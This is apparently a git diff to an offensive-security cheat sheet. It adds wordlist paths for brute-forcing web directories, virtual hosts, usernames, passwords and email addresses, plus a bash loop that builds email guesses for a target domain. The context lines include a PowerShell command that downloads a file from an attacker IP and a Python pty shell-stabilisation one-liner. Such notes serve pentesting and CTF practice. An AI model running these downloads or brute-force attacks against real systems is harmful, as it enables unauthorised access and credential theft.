@@ -163,7 +163,7 @@ powershell -NoProfile -Command "$ip='$Attacker_IP'; iwr http://$ip:$port/file -O
 
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
-# Some Python Automation...
+# 🛺 Some Python Automation...
 ```bash
 # Used to Stable shell's
 python3 -c "import pty; pty.spawn('/bin/bash')"
@@ -180,3 +180,89 @@ python3 -c "import urllib.parse; print(urllib.parse.quote('../'))"
 # Encode Character's
 python3 -c "from urllib.parse import quote; encode_username = quote('username_here'); print(encode_username)"   
 ```
+
+# 📋 Wordlists
+
+### Directory Brute Force Wordlists
+```bash
+# Core classics (high efficiency)
+ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+ /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt
+ /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt
+ /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-directories.txt          # ← hidden gem  
+ /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files.txt
+ /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files.txt
+ /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
+
+# Modern / high-hit additions
+ /usr/share/wordlists/seclists/Discovery/Web-Content/api/api-endpoints.txt               # API heavy targets
+ /usr/share/wordlists/seclists/Discovery/Web-Content/CMS/wordpress.txt                   # or specific CMS
+ /usr/share/wordlists/seclists/Discovery/Web-Content/trickest-cms-wordlist.txt           # auto-updated CMS gem
+
+# Assetnote (recommended for 2026 – fresher than static lists)
+# Download: https://wordlists.assetnote.io/
+ httparchive_directories.txt
+ httparchive_files.txt
+```
+
+### vHosts Brute Force Wordlists
+```bash
+/usr/share/wordlists/seclists/Discovery/DNS/dns-Jhaddix.txt
+/usr/share/wordlists/seclists/Discovery/DNS/shubs-subdomains.txt
+/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+/usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
+/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
+
+# Hidden gems (very high efficiency)
+ /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt                      # short but deadly for vhosts
+ /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt
+
+# Assetnote (best for modern subdomains – monthly updated)
+ commonspeak2_subdomains.txt   # or download the latest from wordlists.assetnote.io
+
+
+[Username Brute Force Wordlists]:-
+/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt
+/usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
+/usr/share/wordlists/seclists/Usernames/Honeypot-Captures/multiplesources-users-fabian-fingerle.de.txt
+/usr/share/wordlists/seclists/Usernames/Names/names.txt
+/usr/share/wordlists/seclists/Usernames/Names/malenames-usa-top1000.txt  or femalenames-usa-top1000.txt or forenames-india-top1000.txt or familynames-usa-top1000.txt
+
+# Extra high-efficiency additions
+ /usr/share/wordlists/seclists/Usernames/cirt-default-usernames.txt
+ /usr/share/wordlists/seclists/Usernames/CommonAdminBase64.txt
+```
+
+### Password Brute Force Wordlists
+```bash
+ /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt
+ /usr/share/wordlists/seclists/Passwords/Common-Credentials/500-worst-passwords.txt
+ /usr/share/wordlists/seclists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt
+ /usr/share/wordlists/seclists/Passwords/Common-Credentials/top_shortlist.txt
+ /usr/share/wordlists/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-1000000.txt
+
+ /usr/share/wordlists/seclists/Passwords/Default-Credentials/
+   # windows-betterdefaultpasslist.txt
+   # ssh-betterdefaultpasslist.txt
+   # tomcat-betterdefaultpasslist.txt
+   # vnc-betterdefaultpasslist.txt
+   # default-passwords.txt               # ← very useful
+
+# Hidden gem
+ /usr/share/wordlists/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt
+```
+
+
+### Best Email Names Brute Force Wordlists
+```bash
+/usr/share/seclists/Fuzzing/email-top-100-domains.txt    (google.com yahhoo.com microsoft.in)...
+ /usr/share/wordlists/seclists/Usernames/Honeypot-Captures/multiplesources-users-fabian-fingerle.de.txt
+ /usr/share/wordlists/seclists/Usernames/Names/names.txt
+ /usr/share/wordlists/seclists/Usernames/Names/forenames-india-top1000.txt
+ /usr/share/wordlists/seclists/Usernames/Names/familynames-india.txt   # combine first + last
+
+
+# bash -c 'while read name; do echo "${name,,}@target.com"; echo "${name// /.}@target.com"; done < Wordlist > emails.txt' 
+# while read name; do echo "${name,,}@target.com"; echo "${name// /.}@target.com"; done <   Wordlist  > emails.txt
+```
+
